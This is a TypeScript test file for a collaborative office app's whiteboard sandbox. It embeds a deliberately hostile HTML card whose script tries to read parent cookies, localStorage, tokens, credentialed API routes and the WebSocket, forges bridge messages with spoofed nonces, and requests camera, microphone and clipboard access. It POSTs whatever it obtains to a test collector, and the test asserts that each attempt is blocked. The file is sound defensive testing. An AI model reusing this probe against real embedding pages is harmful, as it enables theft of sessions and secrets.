// Hostile Whiteboard artifacts, run for real (docs/whiteboard.md, "Isolation"): in a window-like host
// page on the office's own origin (the same iframe sandbox and the bridge's source and nonce checks),
// through the office's renderer, and opened directly in a tab. Each card reports what it could reach
// to a collector of the test's own, since it has network access.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { once } from 'node:events';
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { setTimeout as delay } from 'node:timers/promises';
import { buildSync } from 'esbuild';
import { WebSocket } from 'ws';
import { loadConfig } from '../src/server/config.js';
import { startServer } from '../src/server/server.js';
import { BRIDGE_CHANNEL, CARD_ALLOW } from '../src/shared/whiteboard-bridge.js';
import { CARD_SANDBOX } from '../src/server/whiteboard.js';
import { browserStatus, closeBrowser, launchBrowser, newIsolatedContext } from '../src/server/whiteboard-browser.js';
import type { ServerMsg } from '../src/shared/protocol.js';

const real = browserStatus();
const skip = real.installed ? false : `Chromium isn't downloaded in ${real.path}; run "node bin/droid-office.js browser install" to run this test`;

async function waitFor<T>(read: () => T | undefined | false, what: string, ms = 30_000): Promise<T> {
  const end = Date.now() + ms;
  for (;;) {
    const v = read();
    if (v !== undefined && v !== false) return v;
    if (Date.now() > end) assert.fail(`timed out waiting for ${what}`);
    await delay(25);
  }
}

/** The bridge's validators, bundled for a plain page: the host checks with the very code the window uses. */
function bridgeBundle(): string {
  const out = buildSync({ entryPoints: [path.resolve('src/shared/whiteboard-bridge.ts')], bundle: true, format: 'iife', globalName: 'Bridge', write: false, target: 'es2020' });
  return out.outputFiles[0].text;
}

/** Everything a hostile card tries, then reports to `collector`. `office` is the office's address. */
function hostileCard(collector: string, office: string, floor: string, otherCard: string): string {
  return `<!doctype html><html><head><meta charset="utf-8"><title>hostile</title></head><body><h1>hostile</h1>
<script>
(async function () {
  // The page keeps changing until it has reported, so a render waits for the report instead of
  // settling on a quiet page while a prompt is pending.
  var busy = setInterval(function () { document.body.dataset.tick = String(Date.now()); }, 100);
  await whiteboard.ready;
  var where = whiteboard.rendering ? 'renderer' : 'window';
  var r = { where: where, card: whiteboard.card.id, origin: String(self.origin), referrer: document.referrer, href: location.href };
  function attempt(name, fn) { try { r[name] = 'ok:' + String(fn()).slice(0, 200); } catch (e) { r[name] = 'blocked'; } }
  attempt('parentDocument', function () { return parent.document.title; });
  attempt('parentLocation', function () { return parent.location.href; });
  attempt('topSecret', function () { return top.officeToken; });
  attempt('cookie', function () { return document.cookie; });
  attempt('localStorage', function () { return localStorage.getItem('office-secret'); });
  attempt('parentStorage', function () { return parent.localStorage.getItem('office-secret'); });
  attempt('siblingHash', function () { return parent.frames[1] && parent.frames[1].location.hash; });
  async function read(name, url, init) {
    try {
      var res = await fetch(url, init);
      r[name] = res.type === 'opaque' ? 'opaque' : 'read:' + res.status + ':' + (await res.text()).slice(0, 120);
    } catch (e) { r[name] = 'error'; }
  }
  await read('officeApi', ${JSON.stringify(`${office}/api/whiteboard/render/status?floor=${floor}&card=${otherCard}`)}, { credentials: 'include' });
  await read('officeNoCors', ${JSON.stringify(`${office}/api/health`)}, { mode: 'no-cors', credentials: 'include' });
  await read('officePage', ${JSON.stringify(`${office}/`)}, { credentials: 'include' });
  await read('otherCardById', ${JSON.stringify(`${office}/whiteboard/c/${otherCard}/`)});
  await read('guessedCap', ${JSON.stringify(`${office}/whiteboard/c/k${'A'.repeat(40)}/`)});
  r.ws = await new Promise(function (resolve) {
    try {
      var ws = new WebSocket(${JSON.stringify(`${office.replace(/^http/, 'ws')}/ws?name=Owner`)});
      ws.onopen = function () { resolve('open'); ws.close(); };
      ws.onerror = function () { resolve('refused'); };
      setTimeout(function () { resolve('timeout'); }, 1500);
    } catch (e) { resolve('blocked'); }
  });
  // The bridge: a write with a made-up nonce, the same write through its own nonce (which the host
  // binds to this card only), and a forged init straight to the other card's frame.
  var mine = (location.hash.match(/wb=([A-Za-z0-9_-]+)/) || [])[1] || '';
  parent.postMessage({ channel: ${JSON.stringify(BRIDGE_CHANNEL)}, nonce: 'made-up-nonce-0123456789', type: 'write', write: { op: 'set', path: ['pwn'], value: 'wrong nonce' } }, '*');
  parent.postMessage({ channel: ${JSON.stringify(BRIDGE_CHANNEL)}, nonce: mine, type: 'write', write: { op: 'set', path: ['pwn'], value: 'own nonce' } }, '*');
  // The renderer's harness has no second frame, and reading a missing one throws across origins.
  var sibling = null;
  try { sibling = parent.frames[1]; } catch (e) {}
  if (sibling) sibling.postMessage({ channel: ${JSON.stringify(BRIDGE_CHANNEL)}, nonce: mine, type: 'init', card: { id: 'pwned', title: 'pwned', author: { kind: 'owner' } }, state: { pwned: true }, rendering: false, mode: 'use', width: 1280 }, '*');
  async function settle(p, ms) { return Promise.race([p.then(function () { return 'granted'; }, function (e) { return 'denied:' + (e && e.name); }), new Promise(function (res) { setTimeout(function () { res('pending'); }, ms); })]); }
  var md = navigator.mediaDevices;
  // Side by side, so the whole report fits well inside a render's settling limit.
  var asks = await Promise.all([
    md ? settle(md['getUser' + 'Media']({ video: true }), 1500) : 'unavailable',
    md ? settle(md['getUser' + 'Media']({ audio: true }), 1500) : 'unavailable',
    navigator.clipboard ? settle(navigator.clipboard.readText(), 1500) : 'unavailable',
    new Promise(function (res) {
      if (!navigator.geolocation) return res('unavailable');
      navigator.geolocation.getCurrentPosition(function () { res('granted'); }, function (e) { res('denied:' + e.code); }, { timeout: 1000 });
      setTimeout(function () { res('pending'); }, 1500);
    }),
  ]);
  r.camera = asks[0];
  r.microphone = asks[1];
  r.clipboard = asks[2];
  r.geolocation = asks[3];
  r.permissions = {};
  for (var name of ['camera', 'microphone', 'geolocation', 'clipboard-read']) {
    try { r.permissions[name] = (await navigator.permissions.query({ name: name })).state; } catch (e) { r.permissions[name] = 'unsupported'; }
  }
  await fetch(${JSON.stringify(`${collector}/report`)}, { method: 'POST', body: JSON.stringify(r) }).catch(function () {});
  clearInterval(busy);
})();
</script></body></html>`;
}

/** The well-behaved card next to it: says which card it was told it is, and its state, now and a little later. */
function plainCard(collector: string): string {
  return `<!doctype html><html><body><p>plain</p><script>
whiteboard.ready.then(function () {
  var send = function (when) { fetch(${JSON.stringify(`${collector}/report`)}, { method: 'POST', body: JSON.stringify({ where: (whiteboard.rendering ? 'renderer' : 'window') + ':' + when, card: whiteboard.card.id, state: whiteboard.state.get() }) }); };
  send('first');
  setTimeout(function () { send('later'); }, 2500);
});
</script></body></html>`;
}

/** The window's part, on the office's own origin: two cards' frames, each with its own nonce, and what the host accepted. */
function hostPage(bridge: string, frames: { card: string; cap: string; nonce: string }[], token: string): string {
  return `<!doctype html><html><head><meta charset="utf-8"><title>office</title></head><body>
${frames.map((f) => `<iframe id="f-${f.card}" sandbox="${CARD_SANDBOX}" allow="${CARD_ALLOW}" referrerpolicy="no-referrer" style="width:600px;height:300px" src="/whiteboard/c/${f.cap}/#wb=${f.nonce}"></iframe>`).join('\n')}
<script>${bridge}</script>
<script>
  window.officeToken = ${JSON.stringify(token)};
  localStorage.setItem('office-secret', ${JSON.stringify(token)});
  document.cookie = 'office=' + ${JSON.stringify(token)} + '; path=/';
  var frames = ${JSON.stringify(frames)};
  window.accepted = [];
  window.rejected = [];
  window.addEventListener('message', function (e) {
    var f = frames.find(function (x) { return document.getElementById('f-' + x.card).contentWindow === e.source; });
    if (!f) { rejected.push('source'); return; }
    var msg = Bridge.parseFrameMsg(e.data, f.nonce);
    if (!msg) { rejected.push(f.card + ':' + (e.data && e.data.type)); return; }
    accepted.push({ card: f.card, msg: msg });
    if (msg.type === 'ready') {
      var init = { type: 'init', card: { id: f.card, title: f.card, author: { kind: 'owner' } }, state: { mine: f.card }, rendering: false, mode: 'use', width: 1280 };
      document.getElementById('f-' + f.card).contentWindow.postMessage(Bridge.wrap(init, f.nonce), '*');
    }
  });
</script></body></html>`;
}

test('hostile artifacts reach nothing of the office, in a window, in the renderer and in a tab of their own', { skip, timeout: 110_000 }, async (t) => {
  const root = mkdtempSync(path.join(tmpdir(), 'droid-office-wb-iso-'));
  const project = path.join(root, 'project');
  const home = path.join(root, 'home');
  for (const d of [project, home]) mkdirSync(d, { recursive: true });
  t.after(() => rmSync(root, { recursive: true, force: true }));

  // What the cards report.
  const reports: Record<string, unknown>[] = [];
  const collector = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => {
      body += c;
    });
    req.on('end', () => {
      try {
        if (req.method === 'POST') reports.push(JSON.parse(body));
      } catch {}
      res.writeHead(204, { 'access-control-allow-origin': '*' }).end();
    });
  });
  await new Promise<void>((r) => collector.listen(0, '127.0.0.1', r));
  t.after(() => collector.close());
  const collectorUrl = `http://127.0.0.1:${(collector.address() as AddressInfo).port}`;

  const cfg = loadConfig([project, '--home', home, '--weather', 'clear', '--host', '127.0.0.1']);
  cfg.port = 0;
  cfg.renders = true;
  const office = await startServer(cfg);
  t.after(async () => {
    const closed = once(office.server, 'close');
    office.shutdown();
    await closed;
    await closeBrowser();
  });
  const base = `http://127.0.0.1:${(office.server.address() as AddressInfo).port}`;

  const msgs: ServerMsg[] = [];
  const ws = new WebSocket(`${base.replace('http:', 'ws:')}/ws?name=Owner`, { headers: { origin: base } });
  t.after(() => ws.terminate());
  ws.on('message', (raw) => msgs.push(JSON.parse(String(raw))));
  const welcome = await waitFor(() => msgs.find((m) => m.t === 'welcome') as Extract<ServerMsg, { t: 'welcome' }> | undefined, 'welcome');
  const floor = welcome.floor!;
  const snap = await waitFor(() => msgs.find((m) => m.t === 'whiteboard' && m.update.kind === 'snapshot') as Extract<ServerMsg, { t: 'whiteboard' }> | undefined, 'the snapshot');
  assert.equal(snap.renderer?.available, true, JSON.stringify(snap.renderer));
  const epoch = snap.update.kind === 'snapshot' ? snap.update.epoch : '';

  // The owner adds both cards from the window: upload each page, then one batch.
  const upload = async (html: string) =>
    (await (await fetch(`${base}/api/whiteboard/blob?floor=${floor}&mime=${encodeURIComponent('text/html; charset=utf-8')}`, { method: 'POST', headers: { origin: base }, body: html })).json()) as { hash: string };
  const hostileRef = await upload(hostileCard(collectorUrl, base, floor, 'plain'));
  const plainRef = await upload(plainCard(collectorUrl));
  ws.send(
    JSON.stringify({
      t: 'whiteboard.apply',
      floor,
      envelope: {
        epoch,
        seq: 1,
        ops: [
          { op: 'card.create', card: 'hostile', kind: 'html', title: 'Hostile', content: { entry: 'index.html', files: { 'index.html': hostileRef } } },
          { op: 'card.create', card: 'plain', kind: 'html', title: 'Plain', content: { entry: 'index.html', files: { 'index.html': plainRef } } },
        ],
      },
    }),
  );
  const patch = await waitFor(() => msgs.find((m) => m.t === 'whiteboard' && m.update.kind === 'patch' && m.caps?.hostile) as Extract<ServerMsg, { t: 'whiteboard' }> | undefined, 'the cards');
  const caps = patch.caps!;

  // The office's page never hands its URL (and LAN token) to a frame as a referrer.
  assert.equal((await fetch(`${base}/`)).headers.get('referrer-policy'), 'no-referrer');

  // ---- The window ----
  const browser = await launchBrowser();
  const context = await newIsolatedContext(browser, { viewport: { width: 1300, height: 700 } });
  t.after(() => context.close().catch(() => {}));
  const frames = [
    { card: 'hostile', cap: caps.hostile, nonce: 'n'.repeat(8) + Math.random().toString(36).slice(2).padEnd(16, 'x') },
    { card: 'plain', cap: caps.plain, nonce: 'm'.repeat(8) + Math.random().toString(36).slice(2).padEnd(16, 'y') },
  ];
  const token = office.lanToken;
  // The host page is served on the office's own origin, with the office page's headers.
  await context.route(`${base}/__host?t=${token}`, (route) =>
    route.fulfill({ status: 200, headers: { 'content-type': 'text/html; charset=utf-8', 'referrer-policy': 'no-referrer', 'x-frame-options': 'DENY', 'cache-control': 'no-store' }, body: hostPage(bridgeBundle(), frames, token) }),
  );
  const host = await context.newPage();
  await host.goto(`${base}/__host?t=${token}`);
  const inWindow = await waitFor(() => reports.find((r) => r.where === 'window' && r.card === 'hostile'), "the hostile card's report from the window");
  const plainLater = await waitFor(() => reports.find((r) => r.where === 'window:later'), "the plain card's second report");
  const firstPlain = reports.find((r) => r.where === 'window:first');

  const isolated = (r: Record<string, unknown>) => {
    const where = String(r.where);
    assert.equal(r.origin, 'null', `${where}: the frame's origin is opaque`);
    for (const k of ['parentDocument', 'parentLocation', 'topSecret', 'cookie', 'localStorage', 'parentStorage', 'siblingHash']) assert.equal(r[k], 'blocked', `${where}: ${k} is ${r[k]}`);
    assert.doesNotMatch(String(r.referrer), new RegExp(token), `${where}: no token in the referrer`);
    assert.doesNotMatch(String(r.href), new RegExp(token), `${where}: no token in the frame's URL`);
    assert.equal(r.officeApi, 'error', `${where}: an office route can't be read with credentials`);
    assert.ok(r.officeNoCors === 'opaque' || r.officeNoCors === 'error', `${where}: no-cors is ${r.officeNoCors}`);
    assert.equal(r.officePage, 'error', `${where}: the office page can't be read`);
    assert.ok(/^read:404:/.test(String(r.otherCardById)) || r.otherCardById === 'error', `${where}: another card by id is ${r.otherCardById}`);
    assert.ok(/^read:404:/.test(String(r.guessedCap)) || r.guessedCap === 'error', `${where}: a guessed capability is ${r.guessedCap}`);
    assert.notEqual(r.ws, 'open', `${where}: the office's WebSocket refuses a card`);
    for (const k of ['camera', 'microphone', 'clipboard', 'geolocation']) assert.notEqual(r[k], 'granted', `${where}: ${k} is ${r[k]}`);
    for (const [k, v] of Object.entries(r.permissions as Record<string, string>)) assert.notEqual(v, 'granted', `${where}: permission ${k}`);
  };
  isolated(inWindow);

  // The host took only messages bound to their own frame and nonce, for that frame's card.
  const accepted = (await host.evaluate('window.accepted')) as { card: string; msg: { type: string; write?: { path: string[]; value: unknown } } }[];
  const rejected = (await host.evaluate('window.rejected')) as string[];
  const writes = accepted.filter((a) => a.msg.type === 'write');
  assert.deepEqual(
    writes.map((w) => [w.card, w.msg.write?.value]),
    [['hostile', 'own nonce']],
    'a write is the hostile card own, never another card',
  );
  assert.ok(rejected.includes('hostile:write'), `the wrong nonce was refused: ${rejected}`);
  // The plain card never took the forged init.
  assert.equal(firstPlain?.card, 'plain');
  assert.equal(plainLater.card, 'plain');
  assert.deepEqual(plainLater.state, { mine: 'plain' });

  // ---- A card opened directly in a tab ----
  const tab = await context.newPage();
  await tab.goto(`${base}/whiteboard/c/${caps.hostile}/`);
  const inTab = (await tab.evaluate(
    `[String(self.origin), (function () { try { localStorage.getItem('x'); return 'ok'; } catch (e) { return 'blocked'; } })(), (function () { try { return document.cookie; } catch (e) { return 'blocked'; } })()]`,
  )) as string[];
  assert.deepEqual(inTab, ['null', 'blocked', 'blocked']);
  await tab.close();

  // ---- The renderer: the office renders both cards by itself, and says so ----
  const inRenderer = await waitFor(() => reports.find((r) => r.where === 'renderer' && r.card === 'hostile'), "the hostile card's report from the renderer", 60_000);
  isolated(inRenderer);
  assert.equal(inRenderer.officeNoCors, 'error', "the renderer blocks the office's own address outright");
  const rendered = await waitFor(() => msgs.find((m) => m.t === 'whiteboard.rendered' && m.card === 'plain' && m.info.rev !== undefined) as Extract<ServerMsg, { t: 'whiteboard.rendered' }> | undefined, 'whiteboard.rendered', 60_000);
  assert.equal(rendered.floor, floor);
  assert.equal(rendered.info.current, true);
  const thumb = await fetch(`${base}/api/whiteboard/render?floor=${floor}&card=plain&size=thumb`);
  assert.equal(thumb.status, 200);
  assert.equal(thumb.headers.get('content-type'), 'image/png');
  const png = Buffer.from(await thumb.arrayBuffer());
  assert.equal(png.readUInt32BE(16), 640);
  const tile = await fetch(`${base}/api/whiteboard/render?floor=${floor}&card=plain&tile=0`);
  assert.equal(tile.status, 200);
  assert.equal(tile.headers.get('x-whiteboard-current'), '1');
  assert.equal(tile.headers.get('x-whiteboard-tile-height'), '2048');
  assert.equal(Buffer.from(await tile.arrayBuffer()).readUInt32BE(16), 1280);
  assert.equal((await fetch(`${base}/api/whiteboard/render?floor=${floor}&card=plain&tile=9`)).status, 404);
  const status = (await (await fetch(`${base}/api/whiteboard/render/status?floor=${floor}&card=plain`)).json()) as { available: boolean; image?: { current: boolean; tiles: number } };
  assert.equal(status.available, true);
  assert.equal(status.image?.current, true);

  // A new connection's snapshot is followed by each rendered card's info.
  const late: ServerMsg[] = [];
  const ws2 = new WebSocket(`${base.replace('http:', 'ws:')}/ws?name=Owner`, { headers: { origin: base } });
  t.after(() => ws2.terminate());
  ws2.on('message', (raw) => late.push(JSON.parse(String(raw))));
  await waitFor(() => late.find((m) => m.t === 'whiteboard.rendered' && m.card === 'plain'), 'whiteboard.rendered after a snapshot');
  // The renderer's writes were dropped: nothing in the board came from a render.
  const board = office.floors()[0].whiteboard.board;
  assert.equal(
    board.cards.every((c) => !('pwn' in c.state)),
    true,
  );
});
